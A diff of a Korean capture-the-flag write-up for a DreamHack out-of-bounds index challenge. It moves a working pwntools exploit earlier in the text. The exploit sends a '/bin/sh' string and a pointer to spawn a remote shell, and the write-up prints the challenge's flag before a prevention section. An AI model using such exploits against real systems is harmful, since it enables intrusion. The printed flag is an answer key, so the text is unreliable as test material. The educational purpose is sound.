@@ -55,7 +55,30 @@ int main()
 
 `system(command[idx])`는 선택된 포인터가 가리키는 문자열을 셸 명령으로 실행합니다. 따라서 배열 밖의 위치에 `/bin/sh`를 가리키는 포인터를 준비하면 셸이 실행됩니다.
 
-### 2. 주소 확인 — 배열 밖 인덱스가 name의 일부를 가리킴
+### 2. 익스플로잇 코드
+
+<p align="center">
+  <img src="assets/out_of_bound/exploit.png" width="700" alt="원격에 접속해 /bin/sh 문자열과 포인터를 보내고 인덱스 21을 선택하는 pwntools 코드" />
+</p>
+
+아래는 입력을 읽기 쉽게 풀어 쓴 코드입니다. 서비스 인스턴스를 다시 시작하면 DreamHack 포트가 바뀔 수 있으므로 현재 문제 화면에 표시된 포트를 넣습니다.
+
+```python
+from pwn import *
+
+p = remote("host3.dreamhack.games", 18187)
+
+# name[0:8]에는 문자열, name[8:12]에는 문자열 주소를 기록
+payload = b"/bin/sh\x00" + p32(0x804a0ac)
+
+p.sendline(payload)
+p.sendline(b"21")
+p.interactive()
+```
+
+아래는 `idx=21`이 왜 `name` 안쪽을 읽는지와 페이로드 각 부분이 하는 일을 본 것입니다.
+
+### 3. 주소 확인 — 배열 밖 인덱스가 name의 일부를 가리킴
 
 <p align="center">
   <img src="assets/out_of_bound/addresses.png" width="700" alt="GDB에서 command와 name의 시작 주소를 확인한 화면" />
@@ -84,26 +107,7 @@ command[21]의 위치
 
 즉, `command[21]`은 배열의 실제 10칸을 한참 벗어나며, 이 로컬 주소 배치에서는 그 메모리 위치가 `name[8]`부터 시작합니다. `idx=21`을 고르는 이유는 21 자체에 특별한 기능이 있어서가 아니라, 배열 바깥에서 페이로드가 써 둔 포인터 4바이트가 놓인 위치를 읽기 위해서입니다.
 
-### 3. 페이로드 — 문자열과 그 주소를 차례로 배치
-
-<p align="center">
-  <img src="assets/out_of_bound/exploit.png" width="700" alt="원격에 접속해 /bin/sh 문자열과 포인터를 보내고 인덱스 21을 선택하는 pwntools 코드" />
-</p>
-
-아래는 같은 입력을 읽기 쉽게 풀어 쓴 코드입니다. 서비스 인스턴스를 다시 시작하면 DreamHack 포트가 바뀔 수 있으므로 현재 문제 화면에 표시된 포트를 넣습니다.
-
-```python
-from pwn import *
-
-p = remote("host3.dreamhack.games", 18187)
-
-# name[0:8]에는 문자열, name[8:12]에는 문자열 주소를 기록
-payload = b"/bin/sh\x00" + p32(0x804a0ac)
-
-p.sendline(payload)
-p.sendline(b"21")
-p.interactive()
-```
+### 4. 페이로드 설명 — 문자열과 그 주소를 차례로 배치
 
 입력 바이트를 나누면 다음과 같습니다.
 
@@ -119,7 +123,7 @@ name + 8  ~ name + 11  : p32(0x804a0ac)
 
 전체 실행은 `name에 데이터 기록 → idx=21 입력 → command[21]이 name+8의 포인터를 읽음 → 그 포인터가 name의 /bin/sh 문자열을 가리킴 → system이 /bin/sh 실행` 순서입니다.
 
-### 4. 실행 결과 — 대화형 셸에서 FLAG 확인
+### 5. 실행 결과 — 대화형 셸에서 FLAG 확인
 
 <p align="center">
   <img src="assets/out_of_bound/result.png" width="700" alt="원격 셸에서 ls와 cat flag를 실행해 FLAG를 확인한 화면" />
@@ -133,7 +137,7 @@ DH{2524e20ddeee45f11c8eb9180d572963}
 
 위 값을 DreamHack 문제 페이지의 FLAG 입력란에 붙여 넣어 제출합니다.
 
-### 5. 취약점 예방법
+### 6. 취약점 예방법
 
 입력 인덱스가 실제로 초기화된 명령 범위 안에 있는지 검사해야 합니다. 이 코드에서 명령 문자열은 5개만 초기화되어 있으므로, 사용 가능한 범위를 0~4로 제한하는 편이 안전합니다.
 
@@ -146,5 +150,3 @@ system(command[idx]);
 ```
 
 더 안전한 방식은 `system`에 문자열을 넘기지 않고, 허용된 선택지를 `switch`로 분기해 고정된 실행 파일과 인자를 직접 실행하는 것입니다. 배열 인덱스 범위 검사는 음수와 배열 끝 이후의 값 모두에 적용해야 합니다.
-
-
